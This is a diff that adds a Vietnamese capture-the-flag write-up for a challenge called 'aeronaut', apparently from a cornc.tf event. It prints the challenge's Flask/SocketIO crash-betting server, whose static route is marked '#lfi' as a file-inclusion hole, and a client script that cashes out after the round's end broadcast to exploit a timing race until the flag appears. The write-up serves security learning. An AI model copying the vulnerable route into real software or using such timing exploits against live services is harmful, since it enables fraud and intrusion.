@@ -893,3 +893,263 @@ if 'corn' in response.json()['data'][0]['url']:
     print(response.json()['data'][0]['url'].split("?flag=")[1])
 
 và chúng ta có thể lấy flag 
+
+aeronaut:
+    import os
+import eventlet
+eventlet.monkey_patch()
+
+from flask import Flask, request, send_file
+from flask_cors import CORS
+from flask_socketio import SocketIO, emit
+from gamestate import GameState
+from playerstate import Player
+import time
+
+from utils import *
+
+app = Flask(__name__)
+app.secret_key = 'your_secret_key_here'
+CORS(app)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
+
+gs = GameState()
+
+@app.route('/home')
+@app.route('/')
+@app.route('/index')
+def index():
+    return send_file('static/index.html')
+
+#lfi
+@app.route('/static/<path:filename>')
+def serve_static(filename):
+    return send_file(f'static/{filename}')
+
+# Start game loop in background
+@socketio.on('connect')
+def handle_connect():
+    """Handle new client connection"""
+    sid = request.sid
+    print(f'Client connected: {sid}')
+    
+    # Add new player if not exists
+    if not gs.get_player(sid):
+        gs.add_player(sid, Player(sid))
+    
+    # Send initial game state
+    socketio.emit('game_state', {
+        'phase': gs.game_phase,
+        'multiplier': round(gs.current_multiplier, 2),
+        'time_left': gs.BETTING_DURATION - gs.current_slot_time
+    }, room=sid)
+
+    socketio.emit('player_count', len(gs.players))
+
+
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    """Handle client disconnect"""
+    sid = request.sid
+    print(f'Client disconnected: {sid}')
+    gs.remove_player(sid)
+    socketio.emit('player_count', len(gs.players))
+
+@socketio.on('place_bet')
+def handle_place_bet(data):
+    """Handle bet placement from client"""
+    sid = request.sid
+    player = gs.get_player(sid)
+    
+    if not player:
+        socketio.emit('error', {'message': 'Player not found'}, room=request.sid)
+        return
+        
+    if gs.game_phase != 'betting':
+        socketio.emit('error', {'message': 'Betting closed'}, room=request.sid)
+        return
+    
+    if player.bet > 0:
+        socketio.emit('error', {'message': 'You already placed a bet'}, room=request.sid)
+        return
+    
+
+    try:
+        amount = float(data['amount'])
+    except ValueError:
+        socketio.emit('error', {'message': 'Invalid bet amount'}, room=request.sid)
+        return
+    if amount < 1 or amount > player.balance:
+        socketio.emit('error', {'message': 'Invalid bet amount'}, room=request.sid)
+        return
+    
+    # Deduct bet and update player state
+    success = player.place_bet(amount)
+    if success:
+        socketio.emit('bet_response', {
+            'success': True,
+            'balance': player.balance,
+            'bet_amount': amount
+        }, room=request.sid)
+    else:
+        socketio.emit('bet_response', {'success': False}, room=request.sid)
+
+@socketio.on('cashout')
+def handle_cashout():
+    """Handle cashout request"""
+    sid = request.sid
+    player = gs.get_player(sid)
+    
+    if not player:
+        socketio.emit('error', {'message': 'Player not found'}, room=request.sid)
+        return
+        
+    if gs.game_phase != 'game':
+        socketio.emit('error', {'message': 'Cannot cashout now'}, room=request.sid)
+        return
+    
+    if player.bet == 0:
+        socketio.emit('error', {'message': 'No active bet'}, room=request.sid)
+        return
+    
+    # Calculate winnings
+    winnings = player.bet * gs.current_multiplier
+    player.balance += winnings
+    player.bet = 0
+    
+    socketio.emit('cashout_response', {
+        'success': True,
+        'winnings': round(winnings, 2),
+        'balance': player.balance,
+        'multiplier': round(gs.current_multiplier, 2)
+    }, room=request.sid)
+
+    if player.balance >= 100_000_000:
+        socketio.emit('error', {
+            'message': os.environ.get('FLAG')
+        }, room=request.sid)
+        return
+
+def game_loop():
+    """Background game loop"""
+    round_number = 0
+    random.seed(int(time.time()))
+    mult_list = [generate_multiplier() for i in range(10000)]
+    while True:
+        # Start new round
+        gs.max_multiplier = mult_list[round_number % 10000]
+        round_number += 1
+        gs.current_multiplier = 1.0
+        gs.game_phase = 'betting'
+        gs.round_start_time = time.time()
+        
+        # Betting phase
+        print(bcolors.WARNING + "Betting phase" + bcolors.ENDC)
+        while time.time() - gs.round_start_time < gs.BETTING_DURATION:
+            socketio.sleep(0.1)
+            time_left = gs.BETTING_DURATION - (time.time() - gs.round_start_time)
+            
+            # Broadcast game state
+            socketio.emit('game_state', {
+                'phase': gs.game_phase,
+                'time_left': round(time_left, 1),
+                'multiplier': round(gs.current_multiplier, 2)
+            })
+        
+        # Game phase
+        print(bcolors.OKGREEN + "Game phase" + bcolors.ENDC)
+        for p in gs.players.values(): print(p)
+        gs.game_phase = 'game'
+        start_time = time.time()
+        
+        while gs.current_multiplier < gs.max_multiplier:
+            elapsed = time.time() - start_time
+            gs.current_multiplier = calculate_multiplier(elapsed)  # From utils
+            
+            socketio.emit('game_state', {
+                'phase': gs.game_phase,
+                'multiplier': round(gs.current_multiplier, 2)
+            })
+            
+            socketio.sleep(0.1)  # Update 10x/second
+        
+        # End phase
+        print(bcolors.FAIL + "End phase" + bcolors.ENDC)
+        socketio.emit('game_state', {
+            'phase': 'ended',
+            'multiplier': gs.max_multiplier
+        })
+        
+        socketio.sleep(0.2) # fix latency
+        gs.game_phase = 'ended'
+        # Reset bets
+        for player in gs.players.values():
+            if player.bet > 0:
+                player.lose()
+        
+        socketio.sleep(2)  # Cooldown before next round
+
+if __name__ == '__main__':
+    socketio.start_background_task(game_loop)
+    socketio.run(app, debug=False, port=5000, host='0.0.0.0')
+
+tổng quan ,ta thấy được đây là 1 game có sử dụng web socket , với việc khởi điểm là 10$ và khi khởi động quá trình bet , có các con số phần trăm tăng dần sẽ hiện
+lên trên màn hình và có chức năng cashout , khi cashout thì sẽ lấy số tiền ấy nhân với phần trăm tại thời điểm cashout thì ra số tiền ta có . Tuy vậy , nếu mà 
+thời gian bet kết thúc (k hiện lên màn hình) thì sẽ mất hết xèng
+vậy nên , giải quyết bằng cách chúng ta sẽ viết 1 script để tự động hoá việc này nhằm để tự động hoá việc bet nhằm để căn thời gian để bet chính xác để có thể kiếm
+được nhiều tiền hơn:
+
+Payloads:
+
+import socketio
+
+with socketio.SimpleClient() as sio:
+    sio.connect('https://aeronaut.challs.cornc.tf/')
+
+    print('my sid is', sio.sid)
+
+    balance = 10.0
+    can_bet = True
+    while True:
+        event = sio.receive()
+        # print('received event:', event)
+
+        if balance > 100_000_000:
+            print('You have reached the maximum balance limit.')
+            
+
+        if event[0] == 'bet_response':
+            print('Bet response:', event[1])
+        if event[0] == 'game_state':
+            phase = event[1]['phase']
+
+            if phase == 'betting':
+                if can_bet:
+                    print(f'Placing bet of {balance}')
+                    sio.emit('place_bet', {'amount': balance})
+                    can_bet = False
+            if phase == 'ended':
+                 multiplier = event[1]['multiplier']
+                 sio.emit('cashout')
+                 print(f'Game ended with multiplier: {multiplier}')
+                 print('Waiting for cashout response...')
+        if event[0] == 'cashout_response':
+            if event[1]['success']:
+                winnings = event[1]['winnings']
+                balance_resp = event[1]['balance']
+                multiplier = event[1]['multiplier']
+                balance = balance_resp
+                print(f'Cashout successful! Winnings: {winnings}, New balance: {balance}')
+                can_bet = True
+        if event[0] == 'error':
+            print(f"Error: {event[1]['message']}")
+
+            if "corn{" in event[1]['message']:
+                print("Flag found! Exiting...")
+                break
+            # exit()
+
+và ta có thể lấy flag
+
+
